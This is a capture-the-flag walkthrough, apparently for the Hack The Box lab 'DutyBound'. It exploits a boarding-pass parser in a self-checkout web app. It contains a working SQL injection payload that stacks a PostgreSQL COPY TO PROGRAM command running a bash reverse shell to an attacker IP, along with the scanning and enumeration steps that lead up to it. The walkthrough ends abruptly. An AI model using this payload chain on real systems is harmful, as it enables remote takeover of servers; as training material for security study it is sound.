# DutyBound

<img width="1588" height="277" alt="image" src="https://github.com/user-attachments/assets/32aabc2f-238e-4a61-8ac6-a011e88c9a98" />

----


## port scan 

```
nmap -sC -sV 10.129.50.229 -Pn
```

```ruby
Starting Nmap 7.95 ( https://nmap.org ) at 2026-10-31 19:17 UTC
Nmap scan report for 10.129.9.228
Host is up (0.36s latency).
Not shown: 997 closed tcp ports (reset)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.9p1 Ubuntu 3ubuntu0.18 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp  open  http     nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to https://airsnacks.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
443/tcp open  ssl/http nginx 1.18.0 (Ubuntu)
|_ssl-date: TLS randomness does not represent time
|_http-title: Welcome \xC2\xB7 AirSnacks Self-Checkout
|_http-server-header: nginx/1.18.0 (Ubuntu)
| tls-nextprotoneg: 
|_  http/1.1
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName=airsnacks.htb
| Not valid before: 2026-08-26T08:17:18
|_Not valid after:  2126-08-02T08:17:18
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 39.14 seconds

```


---

## Explore the application

```
echo "10.129.50.229 airsnacks.htb" | sudo tee -a /etc/hosts
```

<img width="1919" height="800" alt="image" src="https://github.com/user-attachments/assets/54c66704-68b2-4841-bb91-19bf2f553bbd" />


---

## enumrate endpoints 

```
feroxbuster -u https://airsnacks.htb -k \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x php,html,txt,bak
```


<img width="1415" height="406" alt="image" src="https://github.com/user-attachments/assets/a585a76f-97c1-4165-96cc-3009769d8cd7" />



**What I found:**

- `/cart/add`
    
- `/checkout`
    
- `/checkout/boarding-pass`
    
- `/checkout/boarding-pass/verify` ← accepts JSON with a `raw` BCBP string
    

**Note:** `/checkout/boarding-pass/verify` takes structured text (BCBP) and parses it. Parsers are where injection lives. That's our entry point.


<img width="1919" height="698" alt="image" src="https://github.com/user-attachments/assets/60702ff0-3fd9-489a-baad-3404e9a0bdfb" />


----

## when click `scan boarding pass` it send json to **`/checkout/boarding-pass/verify`** and response with 

<img width="1559" height="360" alt="image" src="https://github.com/user-attachments/assets/2201d211-838f-4fe3-bd80-32e64cb2a566" />


---

## What the error tells us

```json
{"detail": "expected 'M' at offset 0", "error": "BCBP_ERR_FORMAT_CODE", "item": 1}
```


- **offset 0** — the parser is 0-indexed and checks position 0 first.
    
- **expected 'M'** — the first character must be `M` (BCBP format code, "M" = mandatory single-leg).
    
- **item 1** — this is field/item #1 in its internal model.

---

## let's send it again with **`M`**

<img width="1646" height="412" alt="image" src="https://github.com/user-attachments/assets/2fc33f3c-26c2-4357-b7c1-dfc8cd439c97" />

> ### **What this means:** the parser does _not_ check character-by-character from offset 0. It reads fixed-size fields by position, and at **item 6** it needs the total string length to be at least **60 characters**. The `M` alone satisfied items 1–5, but then it tried to read item 6 (which is a fixed-size block) and ran out of string.

So the "append what it asks for" oracle won't work here — there's no `expected 'X' at offset N` to follow. Instead we need to know **the fixed layout of the first 60 bytes**.

----

## The BCBP layout : 



Standard IATA BCBP (which this parser implements) with `M` (mandatory single-leg) format code:

| Field                        | Offset | Length | Your value          |
| ---------------------------- | ------ | ------ | ------------------- |
| Format Code                  | 0      | 1      | `M`                 |
| Number of Legs               | 1      | 1      | `1`                 |
| Passenger Name               | 2      | 20     | `DOE/JOHN` + spaces |
| Electronic Ticket Indicator  | 22     | 1      | `E`                 |
| Operating Carrier PNR        | 23     | 7      | `ABC123`            |
| From Airport                 | 30     | 3      | `HTB`               |
| To Airport                   | 33     | 3      | `JFK`               |
| Operating Carrier            | 36     | 3      | `BA`                |
| Flight Number                | 39     | 5      | `0123`              |
| Julian Date                  | 44     | 3      | `297`               |
| Compartment                  | 47     | 1      | `Y`                 |
| Seat Number                  | 48     | 4      | `001A`              |
| Check-in Sequence            | 52     | 5      | `0001`              |
| Passenger Status             | 57     | 1      | `A`                 |
| Field Size of Variable Field | 58     | 2      | `16` (hex)          |


The exact string the exploit uses (confirmed by the machine's parser) is:


```text

M1DOE/JOHN            EABC123 HTBJFKBA 0123 297Y001A0001A16F>50B0WW6297BBA 03123
```

Counting:

- `M1` (2)
    
- `DOE/JOHN` + 12 spaces = 20 (total 22)
    
- `E` (23)
    
- `ABC123` (7 chars, with trailing space) = 30
    
- `HTB` (33)
    
- `JFK` (36)
    
- `BA` (38)
    
- `0123` (42)
    
- `297` (45)
    
- `Y` (46)
    
- `001` (49)
    
- `A0001` (5 chars: `A` + `0001` sequence) = 54
    
- `A` (55)
    
- `16` (57) — item 14, field size of item 18 in hex = 0x16 = 22 bytes
    
- `F>50B0WW6297BBA 03123` (22 chars) = 79
    

That's 79 total. The parser's "needs ≥ 60" at item 6 is satisfied because by item 6 it has read 30 chars and is now reading fixed fields — but the _total_ must be ≥60 for it to get past its length check. So any string that's ≥60 chars and has a valid item 1–5 will get past this error.


<img width="1560" height="410" alt="image" src="https://github.com/user-attachments/assets/25192d1e-847b-4ba0-b889-12ae91fdc80a" />


- **`audit_ref`** — the server wrote a row to `bp_scan_audit`. That means your string was parsed and **inserted into the database**. This is the table the SQLi will target.
    
- **`dest: "JFK"`** — confirms the parser read your `JFK` at the "to airport" offset correctly. Your field boundaries are right.
    
- **`eligibility_token`** 
    
- **`exempt: true`** — the checkout logic accepted the pass.



> [**Reference Source**](https://www.iata.org/contentassets/1dccc9ed041b4f3bbdcf8ee8682e75c4/2021_03_02-bcbp-implementation-guide-version-7-.pdf): BCBP is a standardized format, not a random string. I identified it as an IATA BCBP boarding pass based on the error codes `BCBP_ERR_*` returned by the server and consulted IATA Resolution 792 (Bar Coded Boarding Pass) . The mandatory section contains 60 characters with a fixed field order (Format Code, Number of Legs, Passenger Name, etc.) .




----



## idintify SQLI 

add ` ' ` at end we got **`500 INTERNAL SERVER ERROR`**

```
{"raw": "M1DOE/JOHN            EABC123 HTBJFKBA 0123 297Y001A0001A16F>50B0WW6297BBA 03123'"}
```

<img width="1602" height="331" alt="image" src="https://github.com/user-attachments/assets/07113314-962a-43ed-a93a-1f6d3abed56a" />



---

## What the error tells us


```
"detail": "unterminated quoted string at or near \"''')\"\nLINE 1: ...E/JOHN', 'BA', '0123', '297', 'HTB', 'JFK', '', '', 81, ''')"
```



1. **`LINE 1: ...`** — the server is echoing the SQL it tried to run. we can see the column values it extracted from your BCBP string:
    
    - `'DOE/JOHN'` — passenger name (your field, correctly parsed)
        
    - `'BA'` — operating carrier
        
    - `'0123'` — flight number
        
    - `'297'` — Julian date
        
    - `'HTB'` — from airport
        
    - `'JFK'` — to airport
        
    - `'', ''` — two empty fields (probably `compartment` and `seat`, or similar)
        
    - `81` — an integer (probably a row ID or sequence)
        
    - `''')` — **this is where our input lands**
        
2. **`''')`** — this is the tail of the INSERT. The structure is:
    
    ```sql
    
    INSERT INTO bp_scan_audit (..., airline_use) VALUES (..., ''')

    ```
    
    our `'` closed the string literal, then `'')` is the original query's closing. The parser/DB sees `'''` (three quotes in a row) and says "unterminated quoted string."
    
3. **`DCS_ERR_INTERNAL`** — a generic error wrapper. But the `detail` field leaks the raw PostgreSQL error. That's the injection confirmation.


```
VALUES (..., 'INPUT')     -- original
VALUES (..., 'INPUT'')    -- with our single quote
VALUES (..., '...03123''') -- what the DB sees
```


----

## How to turn this into command execution


Now that we know:

1. The query is `INSERT INTO bp_scan_audit (...) VALUES (..., '<input>')`
    
2. PostgreSQL errors are returned
    
3. The app's DB role has `pg_execute_server_program` (we'll confirm this with the `COPY TO PROGRAM` attempt)
    

we construct a payload that:

1. **Closes** the string literal: `'`
    
2. **Closes** the INSERT statement: `);`
    
3. **Adds** a new statement: `COPY (SELECT '') TO PROGRAM '...'`
    
4. **Comments out** the rest: `--`
    

The full payload:

```text

M1DOE/JOHN            EABC123 HTBJFKBA 0123 297Y001A0001A16F>50B0WW6297BBA 03123'); COPY (SELECT '') TO PROGRAM 'bash -c "bash -i >& /dev/tcp/10.10.16.34/4444 0>&1"'; --
```

This becomes:

```sql

INSERT INTO bp_scan_audit (..., airline_use) VALUES (..., '...03123'); COPY (SELECT '') TO PROGRAM 'bash -c "..."'; --')
```


<img width="1901" height="458" alt="image" src="https://github.com/user-attachments/assets/d30f1494-c1f4-4fbe-ba6f-8fda15205c1b" />


---

## 



































































